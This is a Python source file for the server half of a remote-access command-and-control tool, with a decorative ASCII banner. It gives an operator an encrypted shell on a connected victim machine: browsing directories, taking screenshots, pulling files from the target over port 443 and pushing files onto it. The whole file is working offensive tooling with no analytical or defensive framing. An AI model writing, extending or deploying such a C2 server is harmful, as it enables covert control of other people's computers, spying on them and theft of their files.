import ssl
import socket
import os
import platform
import threading


context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")


bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

banner = """\033[35m
                   ⠘⣷
         ⢀⣤⣤⣤⣀⡀⠄⠄⠄⢸⡀
          ⠙⠻⣗⢭⡙⠳⣦⡀⠘⡇⠄⠄⠄⣴⠇
            ⠈⢷⡌⠣⡄⠄⢰⡇⠄⠄⡴⠁
    ⣠⣴⣞⣛⣛⡛⠛⠛⠶⠄⢻⡆⠉⠄⢸⠄⢀⡜⠁⠄⠛⠛⠻⢦⣄
   ⣼⠛⠛⠳⠶⣦⣍⠙⠲⢤⠄⠄⣿⠄⠄⡏⢠⠎⠄⣀⡤⠤⠒⠶⠂⠙⣧⡀
   ⢿⡄⣿⠄⠄⠄⠉⢻⣄⣀⠄⠄⠛⠄⠸⠡⢋⡴⠊⢁⣠⣤⣶⣶⢤⣄⡘⣇
   ⠙⠻⠆⣠⡶⠟⠋⠉⠉⠛⢶⣶⠖⠶⣦⡀⠠⣴⣯⣁⠄⠄⠙⢷⡈⠻⣿
      ⣰⠏⢀⣋⣉⠉⠉⠲⡄⠙⣧⠄⠈⢃⣀⠄⠄⠉⠳⣄⠄⠈⣷⢀⡟
      ⣿⠟⣿⠋⠉⠛⠷⡄⠸⠄⢹⡖⠛⠉⠉⠙⣷⣦⡀⢹⡆⠄⣿⡾⠁
      ⢿⡄⢿⡀⠄⠄⠄⢰⣆⠄⠛⠄⢠⡆⠄⠄⠸⡏⢻⣼⡇⠄⠋
       ⠻⣮⣷⡀⠄⠄⠄⠙⠶⣤⠶⠟⠁⠄⠄⢸⡇⢀⡿⠁
         ⠉⠛⠁⠄⠄⠄⠄⣿⠄⠄⠄⠄⣠⣿⡴⠛
            ⣠⣤⣤⣄⡀⣿    ⠉
        ⢀⣴⠟⠉⣠⠶⠿⠿⣿
     ⢀⣀⣴⠟⢁⣴⠟⠁   ⣿
    ⠙⠿⣭⣤⡴⠟⠁     ⣿

\033[m"""

def connection():
    connection = False
    while connection == False:
        try:
            print(banner)
            print("-" *40)
            print(f"           Binding Port: 9000")
            print("-" *40)
            # Attenticating Connection
            connection = True
            # Listening the Connection

            bindsocket.bind(('', 9000))
            bindsocket.listen(5)

            client_socket, address = bindsocket.accept()
            print(f"\033[32m[*] {address[0]} Connected in {address[1]} Port\033[m")
            global conn
            conn = context.wrap_socket(client_socket, server_side=True)
            dir = conn.recv(4096).decode()

            
            while True:
                
                commands = input(f"\033[32m[+] {dir} >\033[m ")

    
                if commands == "pwd":
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)
                    print(response.decode('utf-8'))
                
                elif commands == "help":
                    print("|==========Help==========|\n"
                          "cd (Dir) - Change Directory\n"
                          "cd .. - Go back a directory\n"
                          "ls -la / ls - list all files in current directory\n"
                          "exit - Shutdown C2 Server\n"
                          "pwd - Show Current Directory\n"
                          "print - Do a Screeshot\n"
                          "download - Download file to server\n"
                          "upload - Upload file to target\n"
                          "clear - Clear terminal\n")


                elif commands == "cd ..":
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)
                    print(response.decode('utf-8'))
                
                elif commands.startswith('cd '):
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)
                    print(response.decode('utf-8'))

                
                elif commands == "ls -la" or commands == "ls":
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)

                    print(response.decode('utf-8'))


                elif commands == "print":
                    conn.sendall(commands.encode('utf-8'))
                    response = conn.recv(4096)

                    print(f"\033[32m[+] {response.decode('utf-8')}\033[m")
                

                elif commands.startswith("download "):
                    def handle_file_transfer():
                        transfer_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                        transfer_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")

                        transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        transfer_socket.bind(('0.0.0.0', 443))
                        transfer_socket.listen(1)
                        print("\033[32m[+] Waiting connection to transfer file...\033[m")

                        while True:
                            client_socket, addr = transfer_socket.accept()
                            with transfer_context.wrap_socket(client_socket, server_side=True) as conn:
                                try:
                                    file_name = conn.recv(1024).decode('utf-8')
                                    with open(file_name, 'wb') as f:
                                        while True:
                                            data = conn.recv(4096)
                                            if not data:
                                                break
                                            f.write(data)
                                    print(f"\033[32m[+] File {file_name} received successfully from {addr}!\033[m")
                                except Exception as e:
                                    print(f"\033[31m[!] Transference error: {e}\033[m")
                                finally:
                                    conn.close()




                    conn.sendall(commands.encode('utf-8'))
                    print("\033[32m[+] Waiting file in 443 port\033[m")
                    threading.Thread(target=handle_file_transfer, daemon=True).start()




                elif commands.startswith('upload '):
                    conn.sendall(commands.encode('utf-8'))
                    parts = commands.split(' ', 1)
                    if len(parts) > 1:
                        file_name = parts[1].strip()
                        if os.path.exists(file_name): 
                            print(f"File exists: {os.path.exists(file_name)}")
            
                            def infiltration_transfer():
                                transfer_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                                transfer_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")


                                transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                transfer_socket.bind(('0.0.0.0', 443))
                                transfer_socket.listen(1)
                                print("\033[32m[+] Waiting for connection to transfer file...\033[m")

                                try:

                                    client_socket, addr = transfer_socket.accept()
                                    print(f"\033[32m[+] Connection from {addr}")

                                    with transfer_context.wrap_socket(client_socket, server_side=True) as conn:
                                        try:

                                            conn.sendall(file_name.encode('utf-8'))
                                            
                                            with open(file_name, 'rb') as f:
                                                while data := f.read(4096):
                                                    conn.sendall(data)
                                            print(f"\033[32m[+] File {file_name} sent successfully!")
                                        except Exception as e:
                                            print(f"\033[31m[!] An error occurred during file transfer: {e}\033[m")
                                except Exception as e:
                                    print(f"\033[31m[!] An error occurred while accepting connection: {e}\033[m")
                                finally:
                                    transfer_socket.close()
                                    
                            threading.Thread(target=infiltration_transfer, daemon=True).start()
                    

            
                elif commands == "exit":
                    disconnect = "SERVER_SHUTDOWN"
                    conn.sendall(disconnect.encode('utf-8'))
                    response = conn.recv(4096)
                    print(response.decode('utf-8'))                
                    bindsocket.close()
                    print("\033[31m[!] Shutting Down server. Client will try to connect again ...\033[m")
                    break

                elif commands == "clear":
                    os.system("clear")

        except KeyboardInterrupt:
            print("\033[31m\n\n[!] Shutting Down server. Client will try to connect again ...\033[m")
        if conn:
            conn.sendall(b"SERVER_SHUTDOWN")  
            conn.close()
        bindsocket.close()


connection()
#shell()
